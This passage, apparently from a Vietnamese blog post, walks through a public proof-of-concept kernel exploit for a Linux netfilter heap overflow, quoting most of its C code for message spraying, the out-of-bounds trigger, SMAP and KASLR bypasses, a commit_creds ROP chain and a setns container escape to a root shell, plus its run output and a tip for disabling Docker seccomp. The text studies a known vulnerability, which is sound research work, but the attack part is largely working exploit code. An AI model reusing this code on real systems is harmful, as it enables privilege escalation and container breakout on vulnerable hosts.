pipe_buffer), GFP_KERNEL_ACCOUNT); ... } Nó không trực tiếp chứa con trỏ hàm, nó chứa con trỏ tới cấu trúc struct pipe_buf_operations mà cấu trúc này lại có con trỏ hàm mà chúng ta cần:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/pipe_fs_i.h struct pipe_buffer{ struct page *page; unsigned int offset, len; const struct pipe_buf_operations *ops; unsigned int flags; unsigned long private; }; struct pipe_buf_operations { ... /* * When The contents of this pipe buffer has been completely * consumed by a reader, -\u0026gt;release() is called. */ void (*release)(struct pipe_node_info *, struct pipe_buffer *); ... }; Bypassing KASLR/SMEP Khi viết vào pipes, câu trúc struct pipe_buffer bị ghi đè, trong đó ops nó trỏ tới một cấu trúc tĩnh nằm trên .data segment: anon_pipe_buf_ops:\n1 2 3 4 5 6 // https://git.kernel.org/pub/scm/linux/kernel/git/tovalds/linux.git/tree/fs/pipe.c static const struct pipe_buf_operations alloc_pipe_buf_ops = { .release = anon_pipe_buf_release, .try_steal = anon_pipe_buf_try_steal, .get = generic_pipe_buf_get, }; Vì khoảng cách giữa địa chỉ của .data segment và .text không đổi, nên ta tính được địa chỉ của kernel_base_addr từ anon_pipe_buf_ops.\nTính như thế nào? Mô tả ở phần POC\rPhun nhiều cấu trúc struct pipe_buffer và chỉnh sửa lại vị tyris của cấu trúc struct sk_buff của data buffer.\nChúng ta đọc dữ liệu từ sk_buff để leak nội dụng của struct pipe_buffer và lấy đại chỉ của anon_pipe_buf_ops\nVới thông tin này, chúng ta sẽ tìm JOP/ROP gadgets. Khi đọc từ unix socket, chúng ta cần giải phóng vùng nhớ của nó.\nNâng quyền Tạo một cấu trúc struct pipe_buffer với mộ con trỏ ops trỏ tới một cấu trúc struct pipe_buf_operations. Cấu trúc này đặt tại cùng địa điểm vì chúng ta biết địa chỉ của nó, chứa hàm mà chúng ta muốn thực thi khi được giải phóng.\nCuối cùng, đóng hết tất cả các pipes =\u0026gt; kích hoạt giải phóng vùng nhớ =\u0026gt; kích hoạt JOP chain. Kernel ROP chain Lưu địa chỉ của RBP tại một só địa chỉ trong kernel để sử dụng khi thực thi\n=\u0026gt; gọi commit_creds(prepare_kernel_cred(NULL)) để install kernel credentials\n=\u0026gt; gọi switch_task_namespace(find_task_by_vpid(1), init_nsproxy) để chuyển không gian tên của tiến trình 1 tới 1 trong những tiến trình khởi tạo.\n=\u0026gt; khô phục giá trị của RBP và trả về thực thi đã dừng (free_pipe_info() trả về). Thoát container và nhảy vào root shell 1 2 3 4 5 6 setns(open(\u0026#34;/proc/1/ns/mnt\u0026#34;, O_RDONLY), 0); setns(open(\u0026#34;/proc/1/ns/pid\u0026#34;, O_RDONLY), 0); setns(open(\u0026#34;/proc/1/ns/net\u0026#34;, O_RDONLY), 0); char *args[] = {\u0026#34;/bin/bash\u0026#34;, \u0026#34;-i\u0026#34;, NULL}; execve(args[0], args, NULL); Phân tích POC Tiếp theo, chúng ta sẽ đi phân tích poc của Andy Nguyen\nNhư demo, poc của anh Any Nguyen cho thấy rất rõ các bước để khai thác từ việc khởi tạo ở STAGE0 đến làm tràn bộ nhớ ở STAGE1, vượt qua SMAP, KSALR, thực thi mã khai thác và thoát khỏi container.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 [+] Linux Privilege Escalation by theflow@ - 2021 [+] STAGE 0: Initialization [*] Setting up namespace sandbox... [*] Initializing sockets and message queues... [+] STAGE 1: Memory corruption [*] Spraying primary messages... [*] Spraying secondary messages... [*] Creating holes in primary messages... [*] Triggering out-of-bounds write... [*] Searching for corrupted primary message... [+] fake_idx: ffc [+] real_idx: fc4 [+] STAGE 2: SMAP bypass [*] Freeing real secondary message... [*] Spraying fake secondary messages... [*] Leaking adjacent secondary message... [+] kheap_addr: ffff91a49cb7f000 [*] Freeing fake secondary messages... [*] Spraying fake secondary messages... [*] Leaking primary message... [+] kheap_addr: ffff91a49c7a0000 [+] STAGE 3: KASLR bypass [*] Freeing fake secondary messages... [*] Spraying fake secondary messages... [*] Freeing sk_buff data buffer... [*] Spraying pipe_buffer objects... [*] Leaking and freeing pipe_buffer object... [+] anon_pipe_buf_ops: ffffffffa1e78380 [+] kbase_addr: ffffffffa0e00000 [+] STAGE 4: Kernel code execution [*] Spraying fake pipe_buffer objects... [*] Releasing pipe_buffer objects... [*] Checking for root... [+] Root privileges gained. [+] STAGE 5: Post-exploitation [*] Escaping container... [*] Cleaning up... [*] Popping root shell... STAGE0 - Khởi tạo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 printf(\u0026#34;[+] STAGE 0: Initialization\\n\u0026#34;); printf(\u0026#34;[*] Setting up namespace sandbox...\\n\u0026#34;); if (setup_sandbox() \u0026lt; 0) goto err_no_rmid; printf(\u0026#34;[*] Initializing sockets and message queues...\\n\u0026#34;); if ((s = socket(AF_INET, SOCK_STREAM, 0)) \u0026lt; 0) { perror(\u0026#34;[-] socket\u0026#34;); goto err_no_rmid; } for (int i = 0; i \u0026lt; NUM_SOCKETS; i++) { if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) \u0026lt; 0) { perror(\u0026#34;[-] socketpair\u0026#34;); goto err_no_rmid; } } for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) \u0026lt; 0) { perror(\u0026#34;[-] msgget\u0026#34;); goto err_no_rmid; } } printf(\u0026#34;\\n\u0026#34;); msqid stand for: Message queue identifier,\rHàm setup_sandbox() có tác thiết lập giới hạn của CPU (dòng 11-17) nhằm mục đích phục có quá trình spray các message. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 int setup_sandbox(void) { if (unshare(CLONE_NEWUSER) \u0026lt; 0) { perror(\u0026#34;[-] unshare(CLONE_NEWUSER)\u0026#34;); return -1; } if (unshare(CLONE_NEWNET) \u0026lt; 0) { perror(\u0026#34;[-] unshare(CLONE_NEWNET)\u0026#34;); return -1; } cpu_set_t set; CPU_ZERO(\u0026amp;set); CPU_SET(0, \u0026amp;set); if (sched_setaffinity(getpid(), sizeof(set), \u0026amp;set) \u0026lt; 0) { perror(\u0026#34;[-] sched_setaffinity\u0026#34;); return -1; } return 0; } Lưu ý, hàm unshare ở dòng 2 và 6 có thể bị chặn bởi cơ chế Seccomp trên docker. Khi đó, hoặc bạn có thể không gọi hai lệnh này, hoặc bạn có thể chạy docker với tùy chọn --security-opt seccomp=unconfined:\n1 2 docker run --rm -it --security-opt seccomp=unconfined debian:jessie \\ unshare --map-root-user --user sh -c whoami Sau đó, chúng ta khởi tạo socket, tạo socketpair (dòng 14-19) và dùng hàm msgget() để tạo hàng đợi messages (dòng 21-26) STAGE1 - Làm tràn bộ nhớ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 printf(\u0026#34;[+] STAGE 1: Memory corruption\\n\u0026#34;); printf(\u0026#34;[*] Spraying primary messages...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { memset(\u0026amp;msg_primary, 0, sizeof(msg_primary)); *(int *)\u0026amp;msg_primary.mtext[0] = MSG_TAG; *(int *)\u0026amp;msg_primary.mtext[4] = i; if (write_msg(msqid[i], \u0026amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) \u0026lt; 0) goto err_rmid; } printf(\u0026#34;[*] Spraying secondary messages...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { memset(\u0026amp;msg_secondary, 0, sizeof(msg_secondary)); *(int *)\u0026amp;msg_secondary.mtext[0] = MSG_TAG; *(int *)\u0026amp;msg_secondary.mtext[4] = i; if (write_msg(msqid[i], \u0026amp;msg_secondary, sizeof(msg_secondary), MTYPE_SECONDARY) \u0026lt; 0) goto err_rmid; } printf(\u0026#34;[*] Creating holes in primary messages...\\n\u0026#34;); for (int i = HOLE_STEP; i \u0026lt; NUM_MSQIDS; i += HOLE_STEP) { if (read_msg(msqid[i], \u0026amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) \u0026lt; 0) goto err_rmid; } printf(\u0026#34;[*] Triggering out-of-bounds write...\\n\u0026#34;); if (trigger_oob_write(s) \u0026lt; 0) goto err_rmid; printf(\u0026#34;[*] Searching for corrupted primary message...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { if (i != 0 \u0026amp;\u0026amp; (i % HOLE_STEP) == 0) continue; if (peek_msg(msqid[i], \u0026amp;msg_secondary, sizeof(msg_secondary), 1) \u0026lt; 0) goto err_no_rmid; if (*(int *)\u0026amp;msg_secondary.mtext[0] != MSG_TAG) { printf(\u0026#34;[-] Error could not corrupt any primary message.\\n\u0026#34;); goto err_no_rmid; } if (*(int *)\u0026amp;msg_secondary.mtext[4] != i) { fake_idx = i; real_idx = *(int *)\u0026amp;msg_secondary.mtext[4]; break; } } if (fake_idx == -1 \u0026amp;\u0026amp; real_idx == -1) { printf(\u0026#34;[-] Error could not corrupt any primary message.\\n\u0026#34;); goto err_no_rmid; } // fake_idx\u0026#39;s primary message has a corrupted next pointer; wrongly // pointing to real_idx\u0026#39;s secondary message. printf(\u0026#34;[+] fake_idx: %x\\n\u0026#34;, fake_idx); printf(\u0026#34;[+] real_idx: %x\\n\u0026#34;, real_idx); printf(\u0026#34;\\n\u0026#34;); Spraying primary messages Cấu trúc của primary messages được xây dựng: 1 2 3 4 struct { long mtype; char mtext[PRIMARY_SIZE - MSG_MSG_SIZE]; } msg_primary; với MSG_MSG_SIZE là kích thước của cấu trúc msg_msg:\n1 2 3 4 5 6 7 8 9 10 #define MSG_MSG_SIZE (sizeof(struct msg_msg)) struct msg_msg { uint64_t m_list_next; uint64_t m_list_prev; uint64_t m_type; uint64_t m_ts; uint64_t next; uint64_t security; }; Hàm write_msg: 1 2 3 4 5 6 7 8 int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) { *(long *)msgp = msgtyp; if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) \u0026lt; 0) { perror(\u0026#34;[-] msgsnd\u0026#34;); return -1; } return 0; } Hàm này gọi msgsnd để gửi những message có kích thước là 4096. Cấu trúc msg_primary bắt nguồn từ lệnh này\nTham số thứ ba được truyền là msgsz - sizeof(long) vì tham số này lấy kích thước của phần mtext, nên chúng ta lấy kích thước của cả cấu trúc msg_primary trừ cho kích thước của mtype.\nĐể hiểu chi tiết hơn, bạn có thể đọc ở đây .\ndòng 6-7 dùng với mục đích kiểm tra double reference ở các bước sau. Spraying second messages 1 2 3 4 5 6 7 8 9 printf(\u0026#34;[*] Spraying secondary messages...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { memset(\u0026amp;msg_secondary, 0, sizeof(msg_secondary)); *(int *)\u0026amp;msg_secondary.mtext[0] = MSG_TAG; *(int *)\u0026amp;msg_secondary.mtext[4] = i; if (write_msg(msqid[i], \u0026amp;msg_secondary, sizeof(msg_secondary), MTYPE_SECONDARY) \u0026lt; 0) goto err_rmid; } Tạo secondary message tương tự với tạo primary messages, chỉ khác là kích thước của msg_secondary lúc này là 1024 thay vì 4096, do đó, cấu trúc của msg_secondary sẽ là: 1 2 3 4 struct { long mtype; char mtext[SECONDARY_SIZE - MSG_MSG_SIZE]; } msg_secondary; Với SECONDARY_SIZE = 1024.\nCreating holes in primary messages 1 2 3 4 5 6 printf(\u0026#34;[*] Creating holes in primary messages...\\n\u0026#34;); for (int i = HOLE_STEP; i \u0026lt; NUM_MSQIDS; i += HOLE_STEP) { if (read_msg(msqid[i], \u0026amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) \u0026lt; 0) goto err_rmid; } Dùng vòng for để giải phóng các primary message với HOLE_STEP = 1024 và NUM_MSQIDS = 4096. Hàm read_msg được định nghĩa như sau: 1 2 3 4 5 6 7 int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) { if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0) \u0026lt; 0) { perror(\u0026#34;[-] msgrcv\u0026#34;); return -1; } return 0; } Dễ thấy, read_msg và write_msg là một cặp hàm gọi tương ứng các lệnh msgsnd và msgrcv để gửi và nhận các messages. Với msgrcv, sau khi nhận xong, nó sẽ giải phóng vùng nhớ được nhận, do đó, nó sẽ tạo ra các lỗ hổng có kích thước bằng 1024 trong các primary message.\nTriggering out-of-bounds write\u0026hellip; 1 2 3 printf(\u0026#34;[*] Triggering out-of-bounds write...\\n\u0026#34;); if (trigger_oob_write(s) \u0026lt; 0) goto err_rmid; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 int trigger_oob_write(int s) { struct __attribute__((__packed__)) { struct ipt_replace replace; struct ipt_entry entry; struct xt_entry_match match; char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2]; struct xt_entry_target target; } data = {0}; data.replace.num_counters = 1; data.replace.num_entries = 1; data.replace.size = (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad) + sizeof(data.target)); data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad) + sizeof(data.target)); data.entry.target_offset = (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad)); data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad)); strcpy(data.match.u.user.name, \u0026#34;icmp\u0026#34;); data.match.u.user.revision = 0; data.target.u.user.target_size = sizeof(data.target); strcpy(data.target.u.user.name, \u0026#34;NFQUEUE\u0026#34;); data.target.u.user.revision = 1; // Partially overwrite the adjacent buffer with 2 bytes of zero. if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, \u0026amp;data, sizeof(data)) != 0) { if (errno == ENOPROTOOPT) { printf(\u0026#34;[-] Error ip_tables module is not loaded.\\n\u0026#34;); return -1; } } return 0; } Hàm trigger_oob_write mục đích là kích hoạt lỗi heap out-of-bound được để cập ở trên. Hàm setsockopt được gọi là dòng 29 có optname là IPT_SO_SET_REPLACE kết hợp với tùy chọn CAP_NET_ADMIN khi tạo docker sẽ kích hoạt hàm xt_compat_target_from_user() - hàm chứa lỗi heap-out-of-bound. Dòng 25 tác giả sử dụng cấu trúc NFQUEUE để kiểm soát giá trị của target-\u0026gt;targetsize. Về cấu trúc của data, tôi vẫn chưa thực sự hiểu. Ở đây, tác giả dùng khai báo struct __attribute__((__packed__)) để cho phép cấu trúc của data có kích thước nhỏ hơn bằng bằng kích thước align (memory alignment); các cấu trúc ipt_* là các cấu trúc được sử dụng trong netfilter và có mối quan hệ như hình bên:\n. Searching for corrupted primary message 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 printf(\u0026#34;[*] Searching for corrupted primary message...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { if (i != 0 \u0026amp;\u0026amp; (i % HOLE_STEP) == 0) continue; if (peek_msg(msqid[i], \u0026amp;msg_secondary, sizeof(msg_secondary), 1) \u0026lt; 0) goto err_no_rmid; if (*(int *)\u0026amp;msg_secondary.mtext[0] != MSG_TAG) { printf(\u0026#34;[-] Error could not corrupt any primary message.\\n\u0026#34;); goto err_no_rmid; } if (*(int *)\u0026amp;msg_secondary.mtext[4] != i) { fake_idx = i; real_idx = *(int *)\u0026amp;msg_secondary.mtext[4]; break; } } if (fake_idx == -1 \u0026amp;\u0026amp; real_idx == -1) { printf(\u0026#34;[-] Error could not corrupt any primary message.\\n\u0026#34;); goto err_no_rmid; } // fake_idx\u0026#39;s primary message has a corrupted next pointer; wrongly // pointing to real_idx\u0026#39;s secondary message. printf(\u0026#34;[+] fake_idx: %x\\n\u0026#34;, fake_idx); printf(\u0026#34;[+] real_idx: %x\\n\u0026#34;, real_idx); Dùng vòng for từ dòng 2-10 để kiểm tra tất cả các message đã được cấp phát Hàm peek_msg() để đọc giá trị của các message và lưu vào msg_secondary, được định nghĩa như sau: 1 2 3 4 5 6 7 8 int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) { if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT) \u0026lt; 0) { perror(\u0026#34;[-] msgrcv\u0026#34;); return -1; } return 0; } Khá giống với hàm read_msg đều gọi hàm msgrcv, điểm khác biệt duy nhất là msgflg có giá trị là MSG_COPY | IPC_NOWAIT\nDòng 11-15 , dùng giá trị của msg_secondary.mtext[4] để kiểm tra xem liệu có xuất hiện trường hợp 2 cấu trúc cùng tham khảo đến một địa chỉ hay không. Ở bước khởi tạo, chúng ta gán mỗi giá trị msg_secondary.mtext[4] là một giá trị chỉ số i tương ứng, trong bước này, nếu tồn tại một message có msg_secondary.mtext[4] khác với chỉ số tương ứng của nó, điều đó có nghĩa message này đang trỏ tới một cấu trúc khác trên primary_message. STAGE 2: SMAP bypass Freeing real secondary message\u0026hellip; 1 2 3 4 printf(\u0026#34;[*] Freeing real secondary message...\\n\u0026#34;); if (read_msg(msqid[real_idx], \u0026amp;msg_secondary, sizeof(msg_secondary), MTYPE_SECONDARY) \u0026lt; 0) goto err_rmid; Giống như những stage trước, để giải phóng các messages đã được cấp phát, ta dùng lệnh read_msg để đọc message rồi giải phóng vùng nhớ đó.\nSpraying fake secondary messages\u0026hellip; 1 2 3 4 5 memset(secondary_buf, 0, sizeof(secondary_buf)); build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242, PAGE_SIZE - MSG_MSG_SIZE, 0); if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) goto err_rmid; Sau khi đã giải phóng message gốc, chúng ta tạo ra một fake secondary message thông qua hàm build_msg_msg: 1 2 3 4 5 6 7 8 9 void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev, uint64_t m_ts, uint64_t next) { msg-\u0026gt;m_list_next = m_list_next; msg-\u0026gt;m_list_prev = m_list_prev; msg-\u0026gt;m_type = MTYPE_FAKE; msg-\u0026gt;m_ts = m_ts; msg-\u0026gt;next = next; msg-\u0026gt;security = 0; } Tiến hành spray cấu trúc skbuff bằng lệnh skbuff: 1 2 3 4 5 6 7 8 9 10 11 int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) { for (int i = 0; i \u0026lt; NUM_SOCKETS; i++) { for (int j = 0; j \u0026lt; NUM_SKBUFFS; j++) { if (write(ss[i][0], buf, size) \u0026lt; 0) { perror(\u0026#34;[-] write\u0026#34;); return -1; } } } return 0; } skbuff là một nguyên liệu tuyệt vời để tạo UAF, thao tác này làm cho cấu trúc skbuf trỏ tới fake message của chúng ta. Khi chúng ta giải phóng fake message, cấu trúc sk_buff vẫn còn và trỏ tới vị trí fake_message của mình.\nĐể thực hiện spray, ta dùng hai vòng for, vòng thứ nhất đi qua tất cả các cặp SOCKETS được khởi tạo, vòng thứ 2 đi qua tất cả các cấu trúc sk_buff đang có trên mỗi cặp socket rồi dùng lệnh write để cấp phát và ghi nội dung fake secondary message của chúng ta.\nLeaking adjacent secondary message 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // Use the fake secondary message to read out-of-bounds. printf(\u0026#34;[*] Leaking adjacent secondary message...\\n\u0026#34;); if (peek_msg(msqid[fake_idx], \u0026amp;msg_fake, sizeof(msg_fake), 1) \u0026lt; 0) goto err_rmid; // Check if the leak is valid. if (*(int *)\u0026amp;msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) { printf(\u0026#34;[-] Error could not leak adjacent secondary message.\\n\u0026#34;); goto err_rmid; } // The secondary message contains a pointer to the primary message. msg = (struct msg_msg *)\u0026amp;msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE]; kheap_addr = msg-\u0026gt;m_list_next; if (kheap_addr \u0026amp; (PRIMARY_SIZE - 1)) kheap_addr = msg-\u0026gt;m_list_prev; printf(\u0026#34;[+] kheap_addr: %\u0026#34; PRIx64 \u0026#34;\\n\u0026#34;, kheap_addr); if ((kheap_addr \u0026amp; 0xFFFF000000000000) != 0xFFFF000000000000) { printf(\u0026#34;[-] Error kernel heap address is incorrect.\\n\u0026#34;); goto err_rmid; } Sau khi spray để cấu trúc sk_buff trỏ đến fake message, ta cần leak địa chỉ của secondary message kế tiếp. Ta cần địa chỉ này để có thể giải phóng vùng nhớ tại đó. Với cấu trúc của msg_fake là: 1 2 3 4 struct { long mtype; char mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE]; } msg_fake; Ở đây, mtext được cấp phát với kích thước là PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE,\n1 2 3 4 #define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg)) struct msg_msgseg { uint64_t next; }; Dùng hàm peek_msg để lấy fake_message tại index fake_idx, lưu vào msg_fake. Câu lệnh ở dòng 7 để đám bảo rằng message chúng ta lấy ra là fake_message. Vì tất cả các message gốc, khi khởi tạo đều gán giá trị tại msg/mtext[SECONDARY_SIZE] = MSG_TAG. Trong cấu trúc struct msg_msg có một trường là m_ts được sử dụng để xác định kích thước dữ liệu trả lại cho user với kích thước gốc là 1024-sizeof(struct msg_msg). Tuy nhiên, chúng ta đã cấp phát với PAGESIZE = 4096 do đó, kích thước này có giá trị là 4096 - sizeof(struct msg_msg). Chính điều này cho phép chúng ta đọc được giá trị của cấu trúc liền kề.\nDo đó, tại dòng 13 lấy địa chỉ của cấu trúc msg_msg tiếp theo từ msg_fake. Sau đó, lấy địa chỉ của trường m_list_next và lưu vào kheap_addr. Vì kheap_addr là nơi bắt đầu của các primary message nên nó sẽ là bội của PRIMARY_SIZE, phép toán kheap_addr \u0026amp; (PRIMARY_SIZE - 1) ở dòng 15 tương đương với kheap_addr mod PRIMARY_SIZE để kiểm tra xem m_list_next có phải là địa chỉ của message kế tiếp không, nếu không phải thì nó sẽ được gán giá trị m_list_prev. Câu lệnh if ở dòng 19-22 để kiểm tra xem địa chỉ của chúng ta có hợp lệ không. Freeing fake secondary messages\u0026hellip; 1 2 printf(\u0026#34;[*] Freeing fake secondary messages...\\n\u0026#34;); free_skbuff(ss, secondary_buf, sizeof(secondary_buf)); 1 2 3 4 5 6 7 8 9 10 11 int free_skbuff(int ss[NUM_SOCKETS][2], void *buf, size_t size) { for (int i = 0; i \u0026lt; NUM_SOCKETS; i++) { for (int j = 0; j \u0026lt; NUM_SKBUFFS; j++) { if (read(ss[i][1], buf, size) \u0026lt; 0) { perror(\u0026#34;[-] read\u0026#34;); return -1; } } } return 0; } Bước tiếp theo giải phóng vùng nhớ fake_secondary messages. Tương tự như hàm spray_skbuff, hàm free_skbuff dùng 2 vòng for để đi qua tất cả các cặp sockets và tất cả các cấu trúc sk_buff trên từng cặp socker để đọc dữ liệu từ vùng nhớ đã được ghi vào ss bằng lệnh read. Lệnh read sau đi đọc xong sẽ tiến hành giải phòng vùng nhớ này Và đừng quên, cấu trúc sk_buff trỏ vào vùng nhớ vừa được giải phóng vẫn còn tồn tại.\nSpraying fake secondary messages\u0026hellip; 1 2 3 4 5 6 7 8 // Put kheap_addr at next to leak its content. Assumes zero bytes before // kheap_addr. printf(\u0026#34;[*] Spraying fake secondary messages...\\n\u0026#34;); memset(secondary_buf, 0, sizeof(secondary_buf)); build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242, sizeof(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE); if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) goto err_rmid; Chúng ta xây dựng lại một fake secondary message, nhưng lần này, chúng ta xây dựng với msg-\u0026gt;next = kheap_addr - MSG_MSGSEG_SIZE, với kheap_addr là địa chỉ được leak từ step trước. Ta tiến hành spray bằng lệnh spray_skbuff. Leaking primary message\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // Use the fake secondary message to read from kheap_addr. printf(\u0026#34;[*] Leaking primary message...\\n\u0026#34;); if (peek_msg(msqid[fake_idx], \u0026amp;msg_fake, sizeof(msg_fake), 1) \u0026lt; 0) goto err_rmid; // Check if the leak is valid. if (*(int *)\u0026amp;msg_fake.mtext[PAGE_SIZE] != MSG_TAG) { printf(\u0026#34;[-] Error could not leak primary message.\\n\u0026#34;); goto err_rmid; } // The primary message contains a pointer to the secondary message. msg = (struct msg_msg *)\u0026amp;msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE]; kheap_addr = msg-\u0026gt;m_list_next; if (kheap_addr \u0026amp; (SECONDARY_SIZE - 1)) kheap_addr = msg-\u0026gt;m_list_prev; // Calculate the address of the fake secondary message. kheap_addr -= SECONDARY_SIZE; printf(\u0026#34;[+] kheap_addr: %\u0026#34; PRIx64 \u0026#34;\\n\u0026#34;, kheap_addr); if ((kheap_addr \u0026amp; 0xFFFF00000000FFFF) != 0xFFFF000000000000) { printf(\u0026#34;[-] Error kernel heap address is incorrect.\\n\u0026#34;); goto err_rmid; Bước này căn bản giống với thao tác lấy địa chỉ của primary message truocs đó, điểm khác suy nhất là chúng ta cấu trúc msg_msg được lấy ra từ địa chỉ PAGE_SIZE-MSG_MSG_SIZE STAGE 3: KASLR bypass Freeing fake secondary messages\u0026hellip; Bước này đơn gian gọi lại hàm free_skbuff để giải phóng vùng nhớ của fake secondary messages.\n1 2 printf(\u0026#34;[*] Freeing fake secondary messages...\\n\u0026#34;); free_skbuff(ss, secondary_buf, sizeof(secondary_buf)); Spraying fake secondary messages\u0026hellip; 1 2 3 4 5 6 // Put kheap_addr at m_list_next \u0026amp; m_list_prev so that list_del() is possible. printf(\u0026#34;[*] Spraying fake secondary messages...\\n\u0026#34;); memset(secondary_buf, 0, sizeof(secondary_buf)); build_msg_msg((void *)secondary_buf, kheap_addr, kheap_addr, 0, 0); if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) goto err_rmid; Chúng ta xây dựng cấu trúc msg_msg mới mà ở đó, m_list_next và m_list_prev cùng trỏ về 1 địa chỉ là kheap_buff\nFreeing sk_buff data buffer\u0026hellip; 1 2 3 printf(\u0026#34;[*] Freeing sk_buff data buffer...\\n\u0026#34;); if (read_msg(msqid[fake_idx], \u0026amp;msg_fake, sizeof(msg_fake), MTYPE_FAKE) \u0026lt; 0) goto err_rmid; Giải phóng vùng nhớ mà sk_buff trỏ tới bằng lệnh read_msg\nSpraying pipe_buffer objects\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 printf(\u0026#34;[*] Spraying pipe_buffer objects...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_PIPEFDS; i++) { if (pipe(pipefd[i]) \u0026lt; 0) { perror(\u0026#34;[-] pipe\u0026#34;); goto err_rmid; } // Write something to populate pipe_buffer. if (write(pipefd[i][1], \u0026#34;pwn\u0026#34;, 3) \u0026lt; 0) { perror(\u0026#34;[-] write\u0026#34;); goto err_rmid; } } Khi pipe được gọi, nó sẽ gọi hàm alloc_pipe_info() để cấp phát các vùng nhớ với cấu trúc là struct pipe_buffer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/pipe.c struct pipe_inode_info *alloc_pipe_info(void) { ... unsigned long pipe_bufs = PIPE_DEF_BUFFERS; ... pipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT); if (pipe == NULL) goto out_free_uid; ... pipe-\u0026gt;bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer), GFP_KERNEL_ACCOUNT); ... } và cấu trúc của struct pipe_buffer:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/pipe_fs_i.h struct pipe_buffer { struct page *page; unsigned int offset, len; const struct pipe_buf_operations *ops; unsigned int flags; unsigned long private; }; struct pipe_buf_operations { ... /* * When the contents of this pipe buffer has been completely * consumed by a reader, -\u0026gt;release() is called. */ void (*release)(struct pipe_inode_info *, struct pipe_buffer *); ... }; chứa con trỏ trỏ tới pipe_buf_operation. Mặt khác, khi được cấp phát, ops sẽ trỏ tới một static struct anon_pipe_buf_ops. Cấu trúc này nằm trong vùng .data:\n1 2 3 4 5 6 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/pipe.c static const struct pipe_buf_operations anon_pipe_buf_ops = { .release = anon_pipe_buf_release, .try_steal = anon_pipe_buf_try_steal, .get = generic_pipe_buf_get, }; Vì khoảng cách từ .data với .text luôn không đổi, nên từ địa chỉ anon_pipe_buf_ops chúng ta có thể tính kernel base address. Vì vậy, chúng ta spray để cấp phát các cấu trúc pipe_buffer với mục tiêu 1 cấu trúc sẽ nằm ngay vị trí được struct sk_buff trỏ tới vừa được giải phóng ở bước trước.\nLeaking and freeing pipe_buffer object\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 printf(\u0026#34;[*] Leaking and freeing pipe_buffer object...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_SOCKETS; i++) { for (int j = 0; j \u0026lt; NUM_SKBUFFS; j++) { if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) \u0026lt; 